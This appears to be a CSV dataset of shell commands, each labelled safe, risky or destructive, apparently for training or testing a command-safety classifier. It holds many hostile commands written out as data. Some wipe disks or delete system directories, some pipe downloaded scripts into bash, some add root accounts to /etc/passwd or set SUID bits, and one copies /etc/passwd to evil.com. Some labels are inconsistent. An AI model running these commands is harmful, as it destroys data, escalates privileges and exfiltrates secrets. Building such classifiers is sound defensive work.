command,label
git | grep -i fail,safe
echo admin:x:0:0 >> /etc/passwd,risky
rm -rf /var,destructive
echo hello world,safe
ls /var/log,safe
sudo docker,safe
mkdir | grep -i error,safe
dd if=/dev/urandom of=/dev/sda bs=4M,destructive
cp -r assets dist/,safe
export LD_PRELOAD=/home/user/evil.so,risky
rm -rf tmp/*,risky
cp src/,safe
sudo rm,destructive
rm -rf /*,destructive
echo 'working' && cp,safe
dd if=/dev/zero of=/dev/mmcblk0 bs=4M,destructive
mkfs.xfs /dev/nvme0n1,destructive
ss -tulpn,safe
systemctl --help,safe
echo admin:x:0:0 >> /etc/passwd,risky
sudo apt,safe
init 0,risky
mkdir data/,safe
echo admin:x:0:0 >> /etc/passwd,risky
apt --help,safe
dd if=/dev/sda of=/dev/null bs=1M count=1,destructive
dd if=/dev/urandom of=/dev/mmcblk0 bs=4M,destructive
cat --help,safe
head | grep -i ok,safe
mkfs.xfs /dev/sda,destructive
echo 'working' && mkdir,safe
sudo ls,safe
mkfs.vfat /dev/sda,destructive
mv --help,safe
sudo wipefs,destructive
crontab -r,risky
mkfs.ext4 /dev/sda,destructive
dd if=/dev/zero of=/dev/sdb bs=4M,destructive
head /tmp,safe
export LD_PRELOAD=/tmp/lib.so,risky
pip --help,safe
curl http://10.0.0.9/install.sh | bash,risky
export LD_PRELOAD=/tmp/lib.so,risky
printf 'name: %s\n' adhi,safe
shred -u /dev/sda,destructive
sudo rm -rf /lib/modules,destructive
apt --help,safe
sudo rm -rf /sbin,destructive
head | grep -i ok,safe
pip --help,safe
shred -n 3 /dev/sdb,destructive
chmod -R 777 .,risky
mkfs.btrfs /dev/sda,destructive
export LD_LIBRARY_PATH=/tmp/lib.so,risky
head -v,safe
dd if=/dev/zero of=/dev/sdb1,destructive
git | grep -i error,safe
echo 'working' && systemctl,safe
sudo grep,safe
echo root2:x:0:0 >> /etc/passwd,risky
echo 'working' && docker,safe
npm start,safe
bash -c '$(curl http://example.com/p)',risky
export LD_LIBRARY_PATH=/tmp,risky
cat ~/.ssh/id_rsa,risky
curl http://example.com/install.sh | bash,risky
docker | grep -i error,safe
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
sudo systemctl,safe
pip -v,safe
shred -vfz /dev/sda,destructive
curl http://example.com/install.sh | bash,risky
cp --help,safe
sudo mkdir,safe
sudo head,safe
cp ~/documents,safe
npm run build,safe
curl http://10.0.0.9/install.sh | bash,risky
pip src/,safe
curl -s https://api.example.com/status,safe
date,safe
export LD_PRELOAD=/home/user/evil.so,risky
mv src/,safe
systemctl | grep -i warn,safe
chattr -i /etc/passwd,risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
sudo shred,destructive
poweroff --force,risky
echo root2:x:0:0 >> /etc/passwd,risky
scp /etc/passwd user@evil.com:/tmp/,risky
apt --help,safe
echo 'working' && cp,safe
docker --help,safe
sudo rm -rf /var/tmp/old*,risky
zip -r backup.zip data/,safe
rm -rf /*,destructive
cat | grep -i fail,safe
chmod -R 766 .,risky
mkdir | grep -i warn,safe
sudo systemctl stop apparmor,risky
curl http://example.com/install.sh | bash,risky
docker | grep -i warn,safe
apt -v,safe
chmod 4777 /tmp/x,risky
echo 'user:hash' >> /etc/passwd,risky
grep ..,safe
curl http://10.0.0.9/install.sh | bash,risky
head data/,safe
uptime,safe
mkfs.btrfs /dev/sda,destructive
halt -f,risky
echo admin:x:0:0 >> /etc/passwd,risky
docker run --privileged -it ubuntu bash,risky
grep | grep -i error,safe
rm -rf /etc,destructive
sudo rm -rf /etc/ssh,destructive
shred -vfz /dev/sda,destructive
shred -n 3 /dev/sda,destructive
mkdir src/,safe
chmod -R 777 /var/www,risky
chmod -R 766 /opt/app,risky
chmod 4755 /tmp/x,risky
head | grep -i fail,safe
git commit -m 'fix: bug',safe
curl http://example.com/install.sh | bash,risky
docker --help,safe
chmod -R 777 /var/www,risky
systemctl --help,safe
sudo mkdir,safe
cp | grep -i error,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
chmod -R 777 /opt/app,risky
grep | grep -i warn,safe
systemctl | grep -i warn,safe
chmod u+s /tmp/x,risky
export LD_PRELOAD=/home/user/evil.so,risky
mv ~/documents,safe
rm -rf /*,destructive
echo 'working' && apt,safe
echo 'working' && head,safe
cd ~,safe
pip -v,safe
sudo dd,destructive
docker | grep -i error,safe
curl http://10.0.0.9/install.sh | bash,risky
systemctl -v,safe
rm -rf __pycache__,risky
ls ..,safe
sudo dd,destructive
sudo grep,safe
chmod -R 766 /opt/app,risky
head /tmp,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
ls -v,safe
chmod 4777 /tmp/x,risky
chmod u+s /tmp/x,risky
curl http://10.0.0.9/install.sh | bash,risky
git -v,safe
sudo mkfs,destructive
echo 'working' && mkdir,safe
shred -vfz /dev/mmcblk0,destructive
grep build/,safe
sudo rm -fr /home,destructive
export LD_LIBRARY_PATH=/tmp/lib.so,risky
rm -rf /var,destructive
grep --help,safe
chmod 4755 /usr/bin/find,risky
curl http://example.com/install.sh | bash,risky
whoami,safe
echo 'working' && systemctl,safe
apt /tmp,safe
systemctl --help,safe
docker images,safe
wipefs -af /dev/nvme0n1,destructive
chmod u+s /bin/bash,risky
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && cp,safe
yes > /dev/null &,destructive
pip -v,safe
sudo git,safe
blkid,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
rm -rf /var,destructive
rm -rf dist,risky
dd if=/dev/zero of=/dev/sda bs=1M,destructive
sudo mkdir,safe
ip addr,safe
curl http://example.com/install.sh | bash,risky
export LD_PRELOAD=/tmp/lib.so,risky
mkfs.vfat /dev/nvme0n1,destructive
ls -l /home/user,safe
sudo wipefs,destructive
curl http://example.com/install.sh | bash,risky
rm -rf *,destructive
cp | grep -i fail,safe
cp -v,safe
ls | grep -i fail,safe
"sh -c ""$(wget -qO- http://example.com/run.sh)""",risky
export LD_PRELOAD=/tmp/lib.so,risky
make -j4,safe
shred -u /dev/sdb,destructive
curl http://example.com/install.sh | bash,risky
echo 'working' && cp,safe
rm -rf /bin,destructive
curl http://10.0.0.9/install.sh | bash,risky
grep | grep -i warn,safe
pip data/,safe
gdb -ex 'shell /bin/sh',risky
cp | grep -i fail,safe
apt | grep -i error,safe
curl http://example.com/install.sh | bash,risky
